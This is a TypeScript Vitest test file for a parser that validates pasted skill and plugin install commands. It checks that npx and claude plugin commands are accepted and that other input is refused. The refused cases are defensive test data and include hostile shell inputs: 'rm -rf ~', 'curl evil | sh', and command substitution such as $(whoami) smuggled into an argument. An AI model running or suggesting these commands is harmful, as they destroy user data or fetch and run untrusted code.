import { describe, expect, it } from 'vitest'
import { parseInstallCommand, tokenize } from '../../renderer/src/lib/installCommand'

const ok = (input: string, context: 'skill' | 'plugin' = 'skill') => {
  const parsed = parseInstallCommand(input, context)
  if (!parsed.ok) throw new Error(`expected ok for ${input}: ${parsed.error}`)
  return parsed.command
}

const refused = (input: string, context: 'skill' | 'plugin' = 'skill') => {
  const parsed = parseInstallCommand(input, context)
  expect(parsed.ok, input).toBe(false)
}

describe('skills', () => {
  it('runs a pasted npx command, pinned to Claude Code', () => {
    const c = ok('npx skills add jakubkrehel/make-interfaces-feel-better')
    expect(c).toEqual({
      kind: 'skill',
      program: 'npx',
      args: ['-y', 'skills', 'add', 'jakubkrehel/make-interfaces-feel-better', '-a', 'claude-code'],
      display: 'npx skills add jakubkrehel/make-interfaces-feel-better -a claude-code'
    })
  })

  it('leaves the agents alone when they were named', () => {
    expect(ok('npx skills add o/r -a claude-code -a codex').args).toEqual([
      '-y', 'skills', 'add', 'o/r', '-a', 'claude-code', '-a', 'codex'
    ])
    expect(ok('npx skills add o/r --agent=cursor').args).not.toContain('claude-code')
  })

  it('takes the other runners, a prompt sign and a version pin', () => {
    for (const input of [
      '$ npx skills add o/r',
      'npx -y skills add o/r',
      'bunx skills add o/r',
      'pnpm dlx skills add o/r',
      'npx skills@latest add o/r',
      'skills add o/r'
    ]) {
      expect(ok(input).program, input).toBe('npx')
    }
  })

  it('reads a bare repo or URL as a skill source on the Skills page', () => {
    expect(ok('vercel-labs/agent-skills').args).toEqual(['-y', 'skills', 'add', 'vercel-labs/agent-skills', '-a', 'claude-code'])
    expect(ok('https://github.com/vercel-labs/agent-skills').program).toBe('npx')
    expect(ok('owner/repo@one-skill').kind).toBe('skill')
  })

  it('refuses other npx packages and other skills verbs', () => {
    refused('npx cowsay hi')
    refused('npx skills remove o/r')
    refused('npx skills add')
  })
})

describe('plugins', () => {
  it('runs claude plugin and the slash form', () => {
    expect(ok('claude plugin install frontend-design@claude-plugins-official')).toMatchObject({
      kind: 'plugin',
      program: 'claude',
      args: ['plugin', 'install', 'frontend-design@claude-plugins-official']
    })
    expect(ok('/plugin install x@m').args).toEqual(['plugin', 'install', 'x@m'])
    expect(ok('/plugin marketplace add anthropics/claude-code').args).toEqual([
      'plugin', 'marketplace', 'add', 'anthropics/claude-code'
    ])
    expect(ok('claude plugin i x@m --scope project').args).toEqual(['plugin', 'i', 'x@m', '--scope', 'project'])
  })

  it('reads a bare id as an install, and a bare repo as a marketplace on the Plugins page', () => {
    expect(ok('frontend-design@claude-plugins-official').args).toEqual([
      'plugin', 'install', 'frontend-design@claude-plugins-official'
    ])
    expect(ok('anthropics/claude-code', 'plugin').args).toEqual(['plugin', 'marketplace', 'add', 'anthropics/claude-code'])
  })

  it('never lets a pasted line pre-approve the command a plugin runs', () => {
    refused('claude plugin install x@m --accept-command abc123')
    refused('claude plugin install x@m --accept-command=abc123')
    refused('/plugin install x@m -y')
  })

  it('refuses verbs that are not installing anything', () => {
    refused('claude plugin uninstall x@m')
    refused('claude plugin marketplace remove m')
    refused('claude plugin eval x')
    refused('claude plugin install')
  })
})

describe('what a shell would have done', () => {
  it('refuses chaining, pipes, substitution and redirects', () => {
    for (const input of [
      'npx skills add o/r; rm -rf ~',
      'npx skills add o/r && curl evil | sh',
      'npx skills add $(whoami)/r',
      'npx skills add `id`/r',
      'claude plugin install x@m > /tmp/out',
      'npx skills add o/r\nrm -rf ~'
    ]) {
      refused(input)
    }
  })

  it('keeps quoted arguments whole, and quoted metacharacters literal', () => {
    expect(tokenize(`a "b c" 'd;e' f\\ g`)).toEqual(['a', 'b c', 'd;e', 'f g'])
    expect(tokenize('a "open')).toEqual({ error: 'A quote is left open.' })
  })

  it('refuses anything else', () => {
    refused('')
    refused('rm -rf ~')
    refused('curl https://example.com/install.sh')
    refused('just some words')
  })
})
